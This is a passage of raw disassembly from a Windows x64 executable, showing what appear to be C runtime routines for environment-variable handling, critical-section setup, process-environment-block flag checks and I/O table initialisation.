   1400086ff:	66 39 30             	cmp    %si,(%rax)
   140008702:	74 1d                	je     0x140008721
   140008704:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140008708:	48 ff c0             	inc    %rax
   14000870b:	66 39 74 45 00       	cmp    %si,0x0(%rbp,%rax,2)
   140008710:	75 f6                	jne    0x140008708
   140008712:	48 8d 6c 45 00       	lea    0x0(%rbp,%rax,2),%rbp
   140008717:	48 83 c5 02          	add    $0x2,%rbp
   14000871b:	66 39 75 00          	cmp    %si,0x0(%rbp)
   14000871f:	75 e3                	jne    0x140008704
   140008721:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   140008726:	48 2b eb             	sub    %rbx,%rbp
   140008729:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   14000872e:	48 83 c5 02          	add    $0x2,%rbp
   140008732:	48 d1 fd             	sar    $1,%rbp
   140008735:	4c 8b c3             	mov    %rbx,%r8
   140008738:	44 8b cd             	mov    %ebp,%r9d
   14000873b:	89 74 24 28          	mov    %esi,0x28(%rsp)
   14000873f:	33 d2                	xor    %edx,%edx
   140008741:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140008746:	33 c9                	xor    %ecx,%ecx
   140008748:	e8 9f fe ff ff       	call   0x1400085ec
   14000874d:	4c 63 f0             	movslq %eax,%r14
   140008750:	85 c0                	test   %eax,%eax
   140008752:	75 0b                	jne    0x14000875f
   140008754:	48 8b cb             	mov    %rbx,%rcx
   140008757:	ff 15 93 7a 00 00    	call   *0x7a93(%rip)        # 0x1400101f0
   14000875d:	eb 96                	jmp    0x1400086f5
   14000875f:	49 8b ce             	mov    %r14,%rcx
   140008762:	e8 41 0e 00 00       	call   0x1400095a8
   140008767:	48 8b f8             	mov    %rax,%rdi
   14000876a:	48 85 c0             	test   %rax,%rax
   14000876d:	75 09                	jne    0x140008778
   14000876f:	33 c9                	xor    %ecx,%ecx
   140008771:	e8 d6 e4 ff ff       	call   0x140006c4c
   140008776:	eb dc                	jmp    0x140008754
   140008778:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   14000877d:	44 8b cd             	mov    %ebp,%r9d
   140008780:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140008785:	4c 8b c3             	mov    %rbx,%r8
   140008788:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   14000878d:	33 d2                	xor    %edx,%edx
   14000878f:	33 c9                	xor    %ecx,%ecx
   140008791:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140008796:	e8 51 fe ff ff       	call   0x1400085ec
   14000879b:	85 c0                	test   %eax,%eax
   14000879d:	75 0a                	jne    0x1400087a9
   14000879f:	48 8b cf             	mov    %rdi,%rcx
   1400087a2:	e8 a5 e4 ff ff       	call   0x140006c4c
   1400087a7:	eb 0a                	jmp    0x1400087b3
   1400087a9:	33 c9                	xor    %ecx,%ecx
   1400087ab:	e8 9c e4 ff ff       	call   0x140006c4c
   1400087b0:	48 8b f7             	mov    %rdi,%rsi
   1400087b3:	48 8b cb             	mov    %rbx,%rcx
   1400087b6:	ff 15 34 7a 00 00    	call   *0x7a34(%rip)        # 0x1400101f0
   1400087bc:	48 8b c6             	mov    %rsi,%rax
   1400087bf:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400087c4:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1400087c9:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   1400087ce:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   1400087d3:	48 83 c4 40          	add    $0x40,%rsp
   1400087d7:	41 5e                	pop    %r14
   1400087d9:	c3                   	ret
   1400087da:	cc                   	int3
   1400087db:	cc                   	int3
   1400087dc:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400087e1:	89 54 24 10          	mov    %edx,0x10(%rsp)
   1400087e5:	55                   	push   %rbp
   1400087e6:	56                   	push   %rsi
   1400087e7:	57                   	push   %rdi
   1400087e8:	41 54                	push   %r12
   1400087ea:	41 55                	push   %r13
   1400087ec:	41 56                	push   %r14
   1400087ee:	41 57                	push   %r15
   1400087f0:	48 83 ec 30          	sub    $0x30,%rsp
   1400087f4:	33 f6                	xor    %esi,%esi
   1400087f6:	8b da                	mov    %edx,%ebx
   1400087f8:	4c 8b f9             	mov    %rcx,%r15
   1400087fb:	48 85 c9             	test   %rcx,%rcx
   1400087fe:	75 10                	jne    0x140008810
   140008800:	e8 af e3 ff ff       	call   0x140006bb4
   140008805:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000880b:	e9 f3 02 00 00       	jmp    0x140008b03
   140008810:	ba 3d 00 00 00       	mov    $0x3d,%edx
   140008815:	49 8b ff             	mov    %r15,%rdi
   140008818:	e8 5f 66 00 00       	call   0x14000ee7c
   14000881d:	4c 8b e8             	mov    %rax,%r13
   140008820:	48 85 c0             	test   %rax,%rax
   140008823:	0f 84 c7 02 00 00    	je     0x140008af0
   140008829:	49 3b c7             	cmp    %r15,%rax
   14000882c:	0f 84 be 02 00 00    	je     0x140008af0
   140008832:	4c 8b 35 df 2a 01 00 	mov    0x12adf(%rip),%r14        # 0x14001b318
   140008839:	4c 3b 35 f0 2a 01 00 	cmp    0x12af0(%rip),%r14        # 0x14001b330
   140008840:	40 8a 68 01          	mov    0x1(%rax),%bpl
   140008844:	40 88 6c 24 70       	mov    %bpl,0x70(%rsp)
   140008849:	75 12                	jne    0x14000885d
   14000884b:	49 8b ce             	mov    %r14,%rcx
   14000884e:	e8 e1 02 00 00       	call   0x140008b34
   140008853:	4c 8b f0             	mov    %rax,%r14
   140008856:	48 89 05 bb 2a 01 00 	mov    %rax,0x12abb(%rip)        # 0x14001b318
   14000885d:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   140008863:	4d 85 f6             	test   %r14,%r14
   140008866:	0f 85 ca 00 00 00    	jne    0x140008936
   14000886c:	85 db                	test   %ebx,%ebx
   14000886e:	74 55                	je     0x1400088c5
   140008870:	48 39 35 a9 2a 01 00 	cmp    %rsi,0x12aa9(%rip)        # 0x14001b320
   140008877:	74 4c                	je     0x1400088c5
   140008879:	e8 22 c9 ff ff       	call   0x1400051a0
   14000887e:	48 85 c0             	test   %rax,%rax
   140008881:	75 1e                	jne    0x1400088a1
   140008883:	e8 2c e3 ff ff       	call   0x140006bb4
   140008888:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000888e:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   140008892:	49 8b cf             	mov    %r15,%rcx
   140008895:	e8 b2 e3 ff ff       	call   0x140006c4c
   14000889a:	8b c5                	mov    %ebp,%eax
   14000889c:	e9 66 02 00 00       	jmp    0x140008b07
   1400088a1:	4c 8b 35 70 2a 01 00 	mov    0x12a70(%rip),%r14        # 0x14001b318
   1400088a8:	4c 3b 35 81 2a 01 00 	cmp    0x12a81(%rip),%r14        # 0x14001b330
   1400088af:	75 7c                	jne    0x14000892d
   1400088b1:	49 8b ce             	mov    %r14,%rcx
   1400088b4:	e8 7b 02 00 00       	call   0x140008b34
   1400088b9:	4c 8b f0             	mov    %rax,%r14
   1400088bc:	48 89 05 55 2a 01 00 	mov    %rax,0x12a55(%rip)        # 0x14001b318
   1400088c3:	eb 68                	jmp    0x14000892d
   1400088c5:	40 84 ed             	test   %bpl,%bpl
   1400088c8:	0f 84 18 01 00 00    	je     0x1400089e6
   1400088ce:	ba 08 00 00 00       	mov    $0x8,%edx
   1400088d3:	49 8b cc             	mov    %r12,%rcx
   1400088d6:	e8 f9 e2 ff ff       	call   0x140006bd4
   1400088db:	33 c9                	xor    %ecx,%ecx
   1400088dd:	48 89 05 34 2a 01 00 	mov    %rax,0x12a34(%rip)        # 0x14001b318
   1400088e4:	e8 63 e3 ff ff       	call   0x140006c4c
   1400088e9:	4c 8b 35 28 2a 01 00 	mov    0x12a28(%rip),%r14        # 0x14001b318
   1400088f0:	4d 85 f6             	test   %r14,%r14
   1400088f3:	74 99                	je     0x14000888e
   1400088f5:	48 39 35 24 2a 01 00 	cmp    %rsi,0x12a24(%rip)        # 0x14001b320
   1400088fc:	75 2f                	jne    0x14000892d
   1400088fe:	ba 08 00 00 00       	mov    $0x8,%edx
   140008903:	49 8b cc             	mov    %r12,%rcx
   140008906:	e8 c9 e2 ff ff       	call   0x140006bd4
   14000890b:	33 c9                	xor    %ecx,%ecx
   14000890d:	48 89 05 0c 2a 01 00 	mov    %rax,0x12a0c(%rip)        # 0x14001b320
   140008914:	e8 33 e3 ff ff       	call   0x140006c4c
   140008919:	48 39 35 00 2a 01 00 	cmp    %rsi,0x12a00(%rip)        # 0x14001b320
   140008920:	0f 84 68 ff ff ff    	je     0x14000888e
   140008926:	4c 8b 35 eb 29 01 00 	mov    0x129eb(%rip),%r14        # 0x14001b318
   14000892d:	4d 85 f6             	test   %r14,%r14
   140008930:	0f 84 58 ff ff ff    	je     0x14000888e
   140008936:	49 8b 06             	mov    (%r14),%rax
   140008939:	4d 8b e5             	mov    %r13,%r12
   14000893c:	4d 2b e7             	sub    %r15,%r12
   14000893f:	49 8b de             	mov    %r14,%rbx
   140008942:	48 85 c0             	test   %rax,%rax
   140008945:	74 34                	je     0x14000897b
   140008947:	4d 8b c4             	mov    %r12,%r8
   14000894a:	48 8b d0             	mov    %rax,%rdx
   14000894d:	49 8b cf             	mov    %r15,%rcx
   140008950:	e8 43 32 00 00       	call   0x14000bb98
   140008955:	85 c0                	test   %eax,%eax
   140008957:	75 10                	jne    0x140008969
   140008959:	48 8b 03             	mov    (%rbx),%rax
   14000895c:	41 80 3c 04 3d       	cmpb   $0x3d,(%r12,%rax,1)
   140008961:	74 0f                	je     0x140008972
   140008963:	41 38 34 04          	cmp    %sil,(%r12,%rax,1)
   140008967:	74 09                	je     0x140008972
   140008969:	48 83 c3 08          	add    $0x8,%rbx
   14000896d:	48 8b 03             	mov    (%rbx),%rax
   140008970:	eb d0                	jmp    0x140008942
   140008972:	49 2b de             	sub    %r14,%rbx
   140008975:	48 c1 fb 03          	sar    $0x3,%rbx
   140008979:	eb 0a                	jmp    0x140008985
   14000897b:	49 2b de             	sub    %r14,%rbx
   14000897e:	48 c1 fb 03          	sar    $0x3,%rbx
   140008982:	48 f7 db             	neg    %rbx
   140008985:	48 85 db             	test   %rbx,%rbx
   140008988:	78 57                	js     0x1400089e1
   14000898a:	49 39 36             	cmp    %rsi,(%r14)
   14000898d:	74 52                	je     0x1400089e1
   14000898f:	49 8b 0c de          	mov    (%r14,%rbx,8),%rcx
   140008993:	e8 b4 e2 ff ff       	call   0x140006c4c
   140008998:	40 84 ed             	test   %bpl,%bpl
   14000899b:	74 15                	je     0x1400089b2
   14000899d:	4d 89 3c de          	mov    %r15,(%r14,%rbx,8)
   1400089a1:	e9 9b 00 00 00       	jmp    0x140008a41
   1400089a6:	49 8b 44 de 08       	mov    0x8(%r14,%rbx,8),%rax
   1400089ab:	49 89 04 de          	mov    %rax,(%r14,%rbx,8)
   1400089af:	48 ff c3             	inc    %rbx
   1400089b2:	49 39 34 de          	cmp    %rsi,(%r14,%rbx,8)
   1400089b6:	75 ee                	jne    0x1400089a6
   1400089b8:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400089be:	48 8b d3             	mov    %rbx,%rdx
   1400089c1:	49 8b ce             	mov    %r14,%rcx
   1400089c4:	e8 63 17 00 00       	call   0x14000a12c
   1400089c9:	33 c9                	xor    %ecx,%ecx
   1400089cb:	48 8b d8             	mov    %rax,%rbx
   1400089ce:	e8 79 e2 ff ff       	call   0x140006c4c
   1400089d3:	48 85 db             	test   %rbx,%rbx
   1400089d6:	74 6c                	je     0x140008a44
   1400089d8:	48 89 1d 39 29 01 00 	mov    %rbx,0x12939(%rip)        # 0x14001b318
   1400089df:	eb 63                	jmp    0x140008a44
   1400089e1:	40 84 ed             	test   %bpl,%bpl
   1400089e4:	75 07                	jne    0x1400089ed
   1400089e6:	8b ee                	mov    %esi,%ebp
   1400089e8:	e9 a5 fe ff ff       	jmp    0x140008892
   1400089ed:	48 f7 db             	neg    %rbx
   1400089f0:	48 8d 53 02          	lea    0x2(%rbx),%rdx
   1400089f4:	48 3b d3             	cmp    %rbx,%rdx
   1400089f7:	0f 82 91 fe ff ff    	jb     0x14000888e
   1400089fd:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   140008a04:	ff ff 1f 
   140008a07:	48 3b d0             	cmp    %rax,%rdx
   140008a0a:	0f 83 7e fe ff ff    	jae    0x14000888e
   140008a10:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140008a16:	49 8b ce             	mov    %r14,%rcx
   140008a19:	e8 0e 17 00 00       	call   0x14000a12c
   140008a1e:	33 c9                	xor    %ecx,%ecx
   140008a20:	4c 8b f0             	mov    %rax,%r14
   140008a23:	e8 24 e2 ff ff       	call   0x140006c4c
   140008a28:	4d 85 f6             	test   %r14,%r14
   140008a2b:	0f 84 5d fe ff ff    	je     0x14000888e
   140008a31:	4d 89 3c de          	mov    %r15,(%r14,%rbx,8)
   140008a35:	49 89 74 de 08       	mov    %rsi,0x8(%r14,%rbx,8)
   140008a3a:	4c 89 35 d7 28 01 00 	mov    %r14,0x128d7(%rip)        # 0x14001b318
   140008a41:	48 8b fe             	mov    %rsi,%rdi
   140008a44:	39 74 24 78          	cmp    %esi,0x78(%rsp)
   140008a48:	0f 84 96 00 00 00    	je     0x140008ae4
   140008a4e:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   140008a52:	4c 8b f5             	mov    %rbp,%r14
   140008a55:	49 ff c6             	inc    %r14
   140008a58:	43 38 34 37          	cmp    %sil,(%r15,%r14,1)
   140008a5c:	75 f7                	jne    0x140008a55
   140008a5e:	ba 01 00 00 00       	mov    $0x1,%edx
   140008a63:	49 8d 4e 02          	lea    0x2(%r14),%rcx
   140008a67:	e8 68 e1 ff ff       	call   0x140006bd4
   140008a6c:	48 8b d8             	mov    %rax,%rbx
   140008a6f:	48 85 c0             	test   %rax,%rax
   140008a72:	75 09                	jne    0x140008a7d
   140008a74:	33 c9                	xor    %ecx,%ecx
   140008a76:	e8 d1 e1 ff ff       	call   0x140006c4c
   140008a7b:	eb 53                	jmp    0x140008ad0
   140008a7d:	4d 8b c7             	mov    %r15,%r8
   140008a80:	49 8d 56 02          	lea    0x2(%r14),%rdx
   140008a84:	48 8b cb             	mov    %rbx,%rcx
   140008a87:	e8 24 d3 ff ff       	call   0x140005db0
   140008a8c:	85 c0                	test   %eax,%eax
   140008a8e:	0f 85 8b 00 00 00    	jne    0x140008b1f
   140008a94:	48 8b c3             	mov    %rbx,%rax
   140008a97:	49 8d 4d 01          	lea    0x1(%r13),%rcx
   140008a9b:	49 2b c7             	sub    %r15,%rax
   140008a9e:	48 03 c8             	add    %rax,%rcx
   140008aa1:	f6 5c 24 70          	negb   0x70(%rsp)
   140008aa5:	48 1b d2             	sbb    %rdx,%rdx
   140008aa8:	42 88 34 28          	mov    %sil,(%rax,%r13,1)
   140008aac:	48 23 d1             	and    %rcx,%rdx
   140008aaf:	48 8b cb             	mov    %rbx,%rcx
   140008ab2:	e8 f9 31 00 00       	call   0x14000bcb0
   140008ab7:	85 c0                	test   %eax,%eax
   140008ab9:	75 21                	jne    0x140008adc
   140008abb:	e8 f4 e0 ff ff       	call   0x140006bb4
   140008ac0:	48 8b cb             	mov    %rbx,%rcx
   140008ac3:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   140008ac9:	e8 7e e1 ff ff       	call   0x140006c4c
   140008ace:	8b f5                	mov    %ebp,%esi
   140008ad0:	48 8b cf             	mov    %rdi,%rcx
   140008ad3:	e8 74 e1 ff ff       	call   0x140006c4c
   140008ad8:	8b c6                	mov    %esi,%eax
   140008ada:	eb 2b                	jmp    0x140008b07
   140008adc:	48 8b cb             	mov    %rbx,%rcx
   140008adf:	e8 68 e1 ff ff       	call   0x140006c4c
   140008ae4:	48 8b cf             	mov    %rdi,%rcx
   140008ae7:	e8 60 e1 ff ff       	call   0x140006c4c
   140008aec:	33 c0                	xor    %eax,%eax
   140008aee:	eb 17                	jmp    0x140008b07
   140008af0:	e8 bf e0 ff ff       	call   0x140006bb4
   140008af5:	49 8b cf             	mov    %r15,%rcx
   140008af8:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140008afe:	e8 49 e1 ff ff       	call   0x140006c4c
   140008b03:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140008b07:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140008b0e:	00 
   140008b0f:	48 83 c4 30          	add    $0x30,%rsp
   140008b13:	41 5f                	pop    %r15
   140008b15:	41 5e                	pop    %r14
   140008b17:	41 5d                	pop    %r13
   140008b19:	41 5c                	pop    %r12
   140008b1b:	5f                   	pop    %rdi
   140008b1c:	5e                   	pop    %rsi
   140008b1d:	5d                   	pop    %rbp
   140008b1e:	c3                   	ret
   140008b1f:	45 33 c9             	xor    %r9d,%r9d
   140008b22:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140008b27:	45 33 c0             	xor    %r8d,%r8d
   140008b2a:	33 d2                	xor    %edx,%edx
   140008b2c:	33 c9                	xor    %ecx,%ecx
   140008b2e:	e8 65 df ff ff       	call   0x140006a98
   140008b33:	cc                   	int3
   140008b34:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008b39:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008b3e:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140008b43:	41 56                	push   %r14
   140008b45:	48 83 ec 30          	sub    $0x30,%rsp
   140008b49:	48 8b f9             	mov    %rcx,%rdi
   140008b4c:	48 85 c9             	test   %rcx,%rcx
   140008b4f:	75 18                	jne    0x140008b69
   140008b51:	33 c0                	xor    %eax,%eax
   140008b53:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140008b58:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140008b5d:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140008b62:	48 83 c4 30          	add    $0x30,%rsp
   140008b66:	41 5e                	pop    %r14
   140008b68:	c3                   	ret
   140008b69:	33 c9                	xor    %ecx,%ecx
   140008b6b:	48 8b c7             	mov    %rdi,%rax
   140008b6e:	48 39 0f             	cmp    %rcx,(%rdi)
   140008b71:	74 0d                	je     0x140008b80
   140008b73:	48 ff c1             	inc    %rcx
   140008b76:	48 8d 40 08          	lea    0x8(%rax),%rax
   140008b7a:	48 83 38 00          	cmpq   $0x0,(%rax)
   140008b7e:	75 f3                	jne    0x140008b73
   140008b80:	48 ff c1             	inc    %rcx
   140008b83:	ba 08 00 00 00       	mov    $0x8,%edx
   140008b88:	e8 47 e0 ff ff       	call   0x140006bd4
   140008b8d:	48 8b d8             	mov    %rax,%rbx
   140008b90:	48 85 c0             	test   %rax,%rax
   140008b93:	74 7e                	je     0x140008c13
   140008b95:	48 8b 07             	mov    (%rdi),%rax
   140008b98:	48 85 c0             	test   %rax,%rax
   140008b9b:	74 51                	je     0x140008bee
   140008b9d:	4c 8b f3             	mov    %rbx,%r14
   140008ba0:	4c 2b f7             	sub    %rdi,%r14
   140008ba3:	48 83 ce ff          	or     $0xffffffffffffffff,%rsi
   140008ba7:	48 ff c6             	inc    %rsi
   140008baa:	80 3c 30 00          	cmpb   $0x0,(%rax,%rsi,1)
   140008bae:	75 f7                	jne    0x140008ba7
   140008bb0:	ba 01 00 00 00       	mov    $0x1,%edx
   140008bb5:	48 8d 4e 01          	lea    0x1(%rsi),%rcx
   140008bb9:	e8 16 e0 ff ff       	call   0x140006bd4
   140008bbe:	33 c9                	xor    %ecx,%ecx
   140008bc0:	49 89 04 3e          	mov    %rax,(%r14,%rdi,1)
   140008bc4:	e8 83 e0 ff ff       	call   0x140006c4c
   140008bc9:	49 8b 0c 3e          	mov    (%r14,%rdi,1),%rcx
   140008bcd:	48 85 c9             	test   %rcx,%rcx
   140008bd0:	74 41                	je     0x140008c13
   140008bd2:	4c 8b 07             	mov    (%rdi),%r8
   140008bd5:	48 8d 56 01          	lea    0x1(%rsi),%rdx
   140008bd9:	e8 d2 d1 ff ff       	call   0x140005db0
   140008bde:	85 c0                	test   %eax,%eax
   140008be0:	75 1b                	jne    0x140008bfd
   140008be2:	48 83 c7 08          	add    $0x8,%rdi
   140008be6:	48 8b 07             	mov    (%rdi),%rax
   140008be9:	48 85 c0             	test   %rax,%rax
   140008bec:	75 b5                	jne    0x140008ba3
   140008bee:	33 c9                	xor    %ecx,%ecx
   140008bf0:	e8 57 e0 ff ff       	call   0x140006c4c
   140008bf5:	48 8b c3             	mov    %rbx,%rax
   140008bf8:	e9 56 ff ff ff       	jmp    0x140008b53
   140008bfd:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140008c03:	45 33 c9             	xor    %r9d,%r9d
   140008c06:	45 33 c0             	xor    %r8d,%r8d
   140008c09:	33 d2                	xor    %edx,%edx
   140008c0b:	33 c9                	xor    %ecx,%ecx
   140008c0d:	e8 86 de ff ff       	call   0x140006a98
   140008c12:	cc                   	int3
   140008c13:	e8 f8 d1 ff ff       	call   0x140005e10
   140008c18:	cc                   	int3
   140008c19:	cc                   	int3
   140008c1a:	cc                   	int3
   140008c1b:	cc                   	int3
   140008c1c:	e9 bb fb ff ff       	jmp    0x1400087dc
   140008c21:	cc                   	int3
   140008c22:	cc                   	int3
   140008c23:	cc                   	int3
   140008c24:	40 53                	rex push %rbx
   140008c26:	48 83 ec 20          	sub    $0x20,%rsp
   140008c2a:	33 db                	xor    %ebx,%ebx
   140008c2c:	48 8d 15 bd 27 01 00 	lea    0x127bd(%rip),%rdx        # 0x14001b3f0
   140008c33:	45 33 c0             	xor    %r8d,%r8d
   140008c36:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140008c3a:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   140008c3e:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140008c43:	e8 c0 12 00 00       	call   0x140009f08
   140008c48:	85 c0                	test   %eax,%eax
   140008c4a:	74 11                	je     0x140008c5d
   140008c4c:	ff 05 ce 29 01 00    	incl   0x129ce(%rip)        # 0x14001b620
   140008c52:	ff c3                	inc    %ebx
   140008c54:	83 fb 0e             	cmp    $0xe,%ebx
   140008c57:	72 d3                	jb     0x140008c2c
   140008c59:	b0 01                	mov    $0x1,%al
   140008c5b:	eb 09                	jmp    0x140008c66
   140008c5d:	33 c9                	xor    %ecx,%ecx
   140008c5f:	e8 24 00 00 00       	call   0x140008c88
   140008c64:	32 c0                	xor    %al,%al
   140008c66:	48 83 c4 20          	add    $0x20,%rsp
   140008c6a:	5b                   	pop    %rbx
   140008c6b:	c3                   	ret
   140008c6c:	48 63 c1             	movslq %ecx,%rax
   140008c6f:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140008c73:	48 8d 05 76 27 01 00 	lea    0x12776(%rip),%rax        # 0x14001b3f0
   140008c7a:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140008c7e:	48 ff 25 63 74 00 00 	rex.W jmp *0x7463(%rip)        # 0x1400100e8
   140008c85:	cc                   	int3
   140008c86:	cc                   	int3
   140008c87:	cc                   	int3
   140008c88:	40 53                	rex push %rbx
   140008c8a:	48 83 ec 20          	sub    $0x20,%rsp
   140008c8e:	8b 1d 8c 29 01 00    	mov    0x1298c(%rip),%ebx        # 0x14001b620
   140008c94:	eb 1d                	jmp    0x140008cb3
   140008c96:	48 8d 05 53 27 01 00 	lea    0x12753(%rip),%rax        # 0x14001b3f0
   140008c9d:	ff cb                	dec    %ebx
   140008c9f:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140008ca3:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140008ca7:	ff 15 4b 74 00 00    	call   *0x744b(%rip)        # 0x1400100f8
   140008cad:	ff 0d 6d 29 01 00    	decl   0x1296d(%rip)        # 0x14001b620
   140008cb3:	85 db                	test   %ebx,%ebx
   140008cb5:	75 df                	jne    0x140008c96
   140008cb7:	b0 01                	mov    $0x1,%al
   140008cb9:	48 83 c4 20          	add    $0x20,%rsp
   140008cbd:	5b                   	pop    %rbx
   140008cbe:	c3                   	ret
   140008cbf:	cc                   	int3
   140008cc0:	48 63 c1             	movslq %ecx,%rax
   140008cc3:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140008cc7:	48 8d 05 22 27 01 00 	lea    0x12722(%rip),%rax        # 0x14001b3f0
   140008cce:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140008cd2:	48 ff 25 17 74 00 00 	rex.W jmp *0x7417(%rip)        # 0x1400100f0
   140008cd9:	cc                   	int3
   140008cda:	cc                   	int3
   140008cdb:	cc                   	int3
   140008cdc:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140008ce3:	00 00 
   140008ce5:	48 8b 48 60          	mov    0x60(%rax),%rcx
   140008ce9:	8b 81 bc 00 00 00    	mov    0xbc(%rcx),%eax
   140008cef:	c1 e8 08             	shr    $0x8,%eax
   140008cf2:	24 01                	and    $0x1,%al
   140008cf4:	c3                   	ret
   140008cf5:	cc                   	int3
   140008cf6:	cc                   	int3
   140008cf7:	cc                   	int3
   140008cf8:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140008cff:	00 00 
   140008d01:	48 8b 48 60          	mov    0x60(%rax),%rcx
   140008d05:	48 8b 41 20          	mov    0x20(%rcx),%rax
   140008d09:	8b 40 08             	mov    0x8(%rax),%eax
   140008d0c:	c1 e8 1f             	shr    $0x1f,%eax
   140008d0f:	c3                   	ret
   140008d10:	40 53                	rex push %rbx
   140008d12:	48 83 ec 20          	sub    $0x20,%rsp
   140008d16:	33 db                	xor    %ebx,%ebx
   140008d18:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140008d1c:	e8 d7 ff ff ff       	call   0x140008cf8
   140008d21:	84 c0                	test   %al,%al
   140008d23:	75 0a                	jne    0x140008d2f
   140008d25:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140008d2a:	e8 31 10 00 00       	call   0x140009d60
   140008d2f:	83 7c 24 30 01       	cmpl   $0x1,0x30(%rsp)
   140008d34:	0f 95 c3             	setne  %bl
   140008d37:	8b c3                	mov    %ebx,%eax
   140008d39:	48 83 c4 20          	add    $0x20,%rsp
   140008d3d:	5b                   	pop    %rbx
   140008d3e:	c3                   	ret
   140008d3f:	cc                   	int3
   140008d40:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008d45:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140008d4a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140008d4f:	57                   	push   %rdi
   140008d50:	48 83 ec 20          	sub    $0x20,%rsp
   140008d54:	ba 48 00 00 00       	mov    $0x48,%edx
   140008d59:	8d 4a f8             	lea    -0x8(%rdx),%ecx
   140008d5c:	e8 73 de ff ff       	call   0x140006bd4
   140008d61:	33 f6                	xor    %esi,%esi
   140008d63:	48 8b d8             	mov    %rax,%rbx
   140008d66:	48 85 c0             	test   %rax,%rax
   140008d69:	74 5b                	je     0x140008dc6
   140008d6b:	48 8d a8 00 12 00 00 	lea    0x1200(%rax),%rbp
   140008d72:	48 3b c5             	cmp    %rbp,%rax
   140008d75:	74 4c                	je     0x140008dc3
   140008d77:	48 8d 78 30          	lea    0x30(%rax),%rdi
   140008d7b:	48 8d 4f d0          	lea    -0x30(%rdi),%rcx
   140008d7f:	45 33 c0             	xor    %r8d,%r8d
   140008d82:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140008d87:	e8 7c 11 00 00       	call   0x140009f08
   140008d8c:	48 83 4f f8 ff       	orq    $0xffffffffffffffff,-0x8(%rdi)
   140008d91:	48 8d 4f 0e          	lea    0xe(%rdi),%rcx
   140008d95:	80 67 0d f8          	andb   $0xf8,0xd(%rdi)
   140008d99:	8b c6                	mov    %esi,%eax
   140008d9b:	48 89 37             	mov    %rsi,(%rdi)
   140008d9e:	c7 47 08 00 00 0a 0a 	movl   $0xa0a0000,0x8(%rdi)
   140008da5:	c6 47 0c 0a          	movb   $0xa,0xc(%rdi)
   140008da9:	40 88 31             	mov    %sil,(%rcx)
   140008dac:	ff c0                	inc    %eax
   140008dae:	48 ff c1             	inc    %rcx
   140008db1:	83 f8 05             	cmp    $0x5,%eax
   140008db4:	72 f3                	jb     0x140008da9
   140008db6:	48 83 c7 48          	add    $0x48,%rdi
   140008dba:	48 8d 47 d0          	lea    -0x30(%rdi),%rax
   140008dbe:	48 3b c5             	cmp    %rbp,%rax
   140008dc1:	75 b8                	jne    0x140008d7b
   140008dc3:	48 8b f3             	mov    %rbx,%rsi
   140008dc6:	33 c9                	xor    %ecx,%ecx
   140008dc8:	e8 7f de ff ff       	call   0x140006c4c
   140008dcd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008dd2:	48 8b c6             	mov    %rsi,%rax
   140008dd5:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140008dda:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140008ddf:	48 83 c4 20          	add    $0x20,%rsp
   140008de3:	5f                   	pop    %rdi
   140008de4:	c3                   	ret
   140008de5:	cc                   	int3
   140008de6:	cc                   	int3
   140008de7:	cc                   	int3
   140008de8:	48 85 c9             	test   %rcx,%rcx
   140008deb:	74 4a                	je     0x140008e37
   140008ded:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008df2:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008df7:	57                   	push   %rdi
   140008df8:	48 83 ec 20          	sub    $0x20,%rsp
